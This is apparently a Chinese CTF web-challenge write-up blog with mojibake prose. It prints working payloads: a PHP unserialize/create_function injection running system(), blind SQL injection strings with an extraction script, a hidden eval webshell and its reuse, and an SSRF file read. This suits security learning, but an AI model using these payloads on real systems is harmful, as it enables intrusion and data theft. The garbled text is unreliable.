<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://node5.anna.nssctf.cn:26952/&#x27;</span></span><br><span class="line">sess=requests.session()</span><br><span class="line">res=sess.get(url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    arg=re.findall(<span class="string">&#x27;&lt;div style=&quot;display:inline;color:#.&#123;6&#125;&quot;&gt;(.)&lt;/div&gt;&#x27;</span>,res.text)</span><br><span class="line">    question=<span class="string">&#x27;&#x27;</span>.join(arg)</span><br><span class="line">    <span class="built_in">print</span>(question)</span><br><span class="line">    answer=<span class="built_in">eval</span>(question[:-<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span>(answer)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    res=sess.post(url,data=&#123;<span class="string">&#x27;ans&#x27;</span>:answer&#125;)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>





<h2 id="FSCTF-2023-CanCanNeed"><a href="#FSCTF-2023-CanCanNeed" class="headerlink" title="[FSCTF 2023]CanCanNeed"></a>[FSCTF 2023]CanCanNeed</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Noteasy</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$param1</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$param2</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span>=<span class="variable language_">$this</span>-&gt;param1;</span><br><span class="line">        <span class="variable">$b</span>=<span class="variable language_">$this</span>-&gt;param2;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|\.|log|scan|chr|local|sess|b2|id|show|cont|high|reverse|flip|rand|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|y2f/i&#x27;</span>, <span class="variable">$this</span>-&gt;param2)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;this param is error!&#x27;</span>); </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="variable">$a</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$b</span>); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;    </span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hi!Welcome to FSCTF2023!&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="variable">$file</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]); </span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$file</span>); &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>ä¸€çœ¼ä¸çœŸï¼Œcreate_function</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Noteasy</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$param1</span>=<span class="string">&#x27;create_function&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$param2</span>=<span class="string">&#x27;&#125;system($_POST[jwk]);//&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Noteasy</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p>æ‹¿æ</p>
<p>è¿˜æœ‰ä¸€ç§æ–¹æ³•</p>
<p>ç›´æ¥requireä¹Ÿè¡Œ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Noteasy</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$param1</span>=<span class="string">&#x27;create_function&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$param2</span>=<span class="string">&#x27;&#125;require(base64_decode(ZmlsZTovLy9mbGFn));//&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Noteasy</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>





<h2 id="æ¹–æ¹˜æ¯-2021-final-Penetratable"><a href="#æ¹–æ¹˜æ¯-2021-final-Penetratable" class="headerlink" title="[æ¹–æ¹˜æ¯ 2021 final]Penetratable"></a>[æ¹–æ¹˜æ¯ 2021 final]Penetratable</h2><p>æœ‰æ³¨å†Œç™»å½•ç•Œé¢ï¼Œæœ‰rootç”¨æˆ·ï¼Œadminç”¨æˆ·</p>
<p>å°è¯•è¶Šæƒæ”¹rootå¯†ç ï¼Œæƒé™ä¸å¤Ÿï¼Œæ”¹adminå¯ä»¥ï¼ŒçŒœæµ‹rootåªæœ‰adminå¯ä»¥æ”¹ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å°±è¦è·å¾—adminæƒé™ã€‚è¿™é‡Œç›´æ¥ç”¨adminè´¦å·ç™»å½•æ˜¯æ”¹ä¸äº†çš„ï¼Œè¢«ç¦ç”¨äº†ã€‚</p>
<p>Informationç•Œé¢ä¼šå°†ä¿¡æ¯å›æ˜¾åˆ°ç•Œé¢ï¼Œé‚£ä¹ˆå°è¯•äºŒæ¬¡æ³¨å…¥</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203150323022.png" alt="image-20241203150323022"></p>
<p>è¿™é‡Œç›´æ¥ä¿®æ”¹å¯†ç ï¼Œä¿®æ”¹çš„å°±æ˜¯adminç”¨æˆ·çš„å¯†ç ï¼</p>
<p>ç„¶åå‘ç°æŒ‰é’®ä¸èƒ½æŒ‰ï¼Œf12çœ‹ä¸€ä¸‹å°±å¥½ï¼Œè‡ªå·±æ„é€ æ•°æ®åŒ…ï¼Œè¿™é‡Œç›´æ¥çœ‹jsæºç å°±è¡Œäº†ï¼Œé‡Œé¢éƒ½æœ‰</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203151646902.png" alt="image-20241203151646902"></p>
<p>rootå¯†ç æˆåŠŸä¿®æ”¹æˆ123456ï¼Œç™»é™†ä¸€ä¸‹çœ‹çœ‹ã€‚</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203151737374.png" alt="image-20241203151737374"></p>
<p>æˆåŠŸç™»å½•ï¼Œå¤šäº†ä¸€ä¸ªæ–‡ä»¶ä¸‹è½½çš„åŠŸèƒ½ç‚¹</p>
<p>æŠ“ä¸€ä¸‹åŒ…çœ‹çœ‹</p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203151855387.png" alt="image-20241203151855387" style="zoom:67%;" />

<p>çœ‹çœ‹èƒ½ä¸èƒ½ä»»æ„æ–‡ä»¶ä¸‹è½½ã€‚</p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203152039720.png" alt="image-20241203152039720" style="zoom: 67%;" />

<p>ç›®å½•ç©¿è¶Šæ¼æ´~</p>
<p>ä¹‹å‰æ‰«æºç æ‰«åˆ°è¿‡phpinfo.phpï¼Œé‚£å°±è¯»å–ä¸€ä¸‹è¯•è¯•ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;pass_31d5df001717&#x27;</span>])===<span class="string">&#x27;3fde6bb0541387e4ebdadf7c2ff31123&#x27;</span>)&#123;@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cc&#x27;</span>]);&#125; </span><br><span class="line"><span class="comment">// hint: Checker will not detect the existence of phpinfo.php, please delete the file when fixing the vulnerability.</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203152536667.png" alt="image-20241203152536667"></p>
<p>æ­£å¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åº”è¯¥æ˜¯å¯ä»¥ç›´æ¥æ‹¿åˆ°&#x2F;flagçš„å†…å®¹çš„ï¼Œä½†æ˜¯è¿™é‡Œï¼ï¼ä»–å±…ç„¶ä¸è®©æˆ‘è¯»ï¼æƒé™å¤ªä½äº†ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥è¦åšçš„å°±æ˜¯ææƒï¼</p>
<p>å…ˆä¸Šçº¿å“¥æ–¯æ‹‰ï¼</p>
<p>è¿™é‡Œæ³¨æ„ä¸€ä¸ªé—®é¢˜ï¼Œä»–çš„å¯†ç ccæ˜¯GETç±»å‹ä¼ å‚çš„ï¼Œè¿™ä¸èƒ½è¢«webshellç®¡ç†å·¥å…·åˆ©ç”¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬cc&#x3D;eval($_POST[1]);ç„¶åæŠŠ1å½“ä½œå¯†ç å³å¯ã€‚</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203153252371.png" alt="image-20241203153252371"></p>
<p>å®é”¤äº†ï¼</p>
<p>ææƒå§æ¥ä¸‹æ¥<br><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203154849744.png" alt="image-20241203154849744"></p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203155021110.png" alt="image-20241203155021110"></p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203155429796.png" alt="image-20241203155429796"></p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203155415823.png" alt="image-20241203155415823"></p>
<p>æ‹¿æï¼</p>
<h2 id="CISCN-2022-åˆèµ›-ezpop"><a href="#CISCN-2022-åˆèµ›-ezpop" class="headerlink" title="[CISCN 2022 åˆèµ›]ezpop"></a>[CISCN 2022 åˆèµ›]ezpop</h2><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203163625594.png" alt="image-20241203163625594"></p>
<p>ç”¨phpggcè¯•äº†åŠå¤©ç»“æœä¸è¡Œï¼Œä¸çŸ¥é“ä¸ºå•¥</p>
<p>åªèƒ½è‡ªå·±è·Ÿäº†ï¼Œè·Ÿæ‰“0dayä¸€æ ·ã€‚ã€‚ã€‚ã€‚ä¸è¿‡æŒºå¥½çš„</p>
<p>è¯¦æƒ…çœ‹ç¬”è®°ï¼ï¼ï¼è¯´ç™½äº†ç›´æ¥ç”¨expå°±è¡Œ</p>
<h2 id="NSSCTF-2022-Spring-Recruit-babysql"><a href="#NSSCTF-2022-Spring-Recruit-babysql" class="headerlink" title="[NSSCTF 2022 Spring Recruit]babysql"></a>[NSSCTF 2022 Spring Recruit]babysql</h2><p>ä¸€é“å¸ƒå°”ç›²æ³¨ï¼Œè¿™é‡Œç»™å‡ºpayload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tarnish&#x27;&amp;&amp;(ascii(substr((select/**/database()),&#123;&#125;,1))&gt;&#123;&#125;)&amp;&amp;/**/&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">tarnish&#x27;&amp;&amp;(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;)&amp;&amp;/**/&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">tarnish&#x27;&amp;&amp;(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_table=&#x27;flag&#x27;),&#123;&#125;,1))&gt;&#123;&#125;)&amp;&amp;/**/&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">tarnish&#x27;&amp;&amp;(ascii(substr((select/**/flag/**/from/**/flag),&#123;&#125;,1))&gt;&#123;&#125;)&amp;&amp;/**/&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node5.anna.nssctf.cn:28905/&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="built_in">max</span> = <span class="number">127</span></span><br><span class="line">    <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">min</span>&lt;<span class="built_in">max</span>:</span><br><span class="line">        mid = (<span class="built_in">max</span>+<span class="built_in">min</span>)//<span class="number">2</span></span><br><span class="line">        payload = <span class="string">&quot;tarnish&#x27;&amp;&amp;(ascii(substr((select/**/group_concat(flag)/**/from/**/flag),&#123;&#125;,1))&gt;&#123;&#125;)&amp;&amp;/**/&#x27;1&#x27;=&#x27;1&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url= url,data=data)</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">min</span>=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">max</span>=mid</span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">min</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;700253f7-9510-4244-a934-a68ed47bbff4&#125;</span><br></pre></td></tr></table></figure>





<h2 id="HDCTF-2023-YamiYami"><a href="#HDCTF-2023-YamiYami" class="headerlink" title="[HDCTF 2023]YamiYami"></a>[HDCTF 2023]YamiYami</h2><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241204183506892.png" alt="image-20241204183506892"></p>
<p>æ‰“å¼€å‘ç°æœ‰ä¸‰ä¸ªåŠŸèƒ½ç‚¹ï¼Œç¬¬ä¸€ä¸ªæ˜¯ssrfä¸€æ ·çš„å­˜åœ¨ï¼Œç¬¬äºŒä¸ªæ˜¯ä¸Šä¼ æ–‡ä»¶ï¼Œç¬¬ä¸‰ä¸ªæ˜¯pwd</p>
<p>å…ˆæµ‹ä¸€ä¸‹ç¬¬ä¸€ä¸ª</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241204183619864.png" alt="image-20241204183619864"></p>
<p>oké‚£è¯»ä¸€ä¸‹æºç å˜›ï¼</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241204183641915.png" alt="image-20241204183641915"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.*</span><br></pre></td></tr></table></figure>

<p>è¢«è¿‡æ»¤äº†ï¼ï¼ï¼äºŒæ¬¡urlç¼–ç æ¥ç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28466/read?url=file:///%2561pp/%2561pp.py</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re, random, uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> yaml <span class="comment">#é—®é¢˜æ‰€åœ¨ pyyamlååºåˆ—åŒ–</span></span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random() * <span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">False</span></span><br><span class="line">BLACK_LIST = [<span class="string">&quot;yaml&quot;</span>, <span class="string">&quot;YAML&quot;</span>, <span class="string">&quot;YML&quot;</span>, <span class="string">&quot;yml&quot;</span>, <span class="string">&quot;yamiyami&quot;</span>]</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&quot;/app/uploads&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;passport&#x27;</span>] = <span class="string">&#x27;YamiYami&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Welcome to HDCTF2023 &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;br&gt;</span></span><br><span class="line"><span class="string">    Here is the challenge &lt;a href=&quot;/upload&quot;&gt;Upload file&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;br&gt;</span></span><br><span class="line"><span class="string">    Enjoy it &lt;a href=&quot;/pwd&quot;&gt;pwd&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/pwd&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwd</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(pwdpath)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        m = re.findall(<span class="string">&#x27;app.*&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;re.findall(&#x27;app.*&#x27;, url, re.IGNORECASE)&quot;</span></span><br><span class="line">        <span class="keyword">if</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;re.findall(&#x27;flag&#x27;, url, re.IGNORECASE)&quot;</span></span><br><span class="line">        res = urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(ex))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">for</span> blackstr <span class="keyword">in</span> BLACK_LIST:</span><br><span class="line">        <span class="keyword">if</span> blackstr <span class="keyword">in</span> filename:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">            flash(<span class="string">&#x27;No file part&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line">        file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Empty file&quot;</span></span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">            filename = secure_filename(file.filename)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;./uploads/&#x27;</span>):</span><br><span class="line">                os.makedirs(<span class="string">&#x27;./uploads/&#x27;</span>)</span><br><span class="line">            file.save(os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;upload successfully!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/boogipop&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&quot;passport&quot;</span>) == <span class="string">&quot;Welcome To HDCTF2023&quot;</span>:</span><br><span class="line">        LoadedFile = request.args.get(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(LoadedFile):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;file not exists&quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(LoadedFile) <span class="keyword">as</span> f:</span><br><span class="line">            yaml.full_load(f)</span><br><span class="line">            f.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;van you see&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Auth bro&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwdpath = os.popen(<span class="string">&quot;pwd&quot;</span>).read()</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">False</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¤šäº†ä¸€ä¸ªè·¯ç”±ï¼Œæˆ‘æ€ä¹ˆæ„Ÿè§‰é™¤äº†pwdï¼Œå…¶ä»–ä¸‰ä¸ªè·¯ç”±éƒ½æœ‰æ´å•Šï¼ï¼ï¼</p>
<p>&#x2F;readå¯èƒ½ç›´æ¥è¯»å–åˆ°flagï¼Œè¿™é‡Œæœ‰ä¸ªéé¢„æœŸï¼Œç›´æ¥è¯»file:&#x2F;&#x2F;&#x2F;proc&#x2F;1&#x2F;environç›´æ¥å‡ºäº†flag</p>
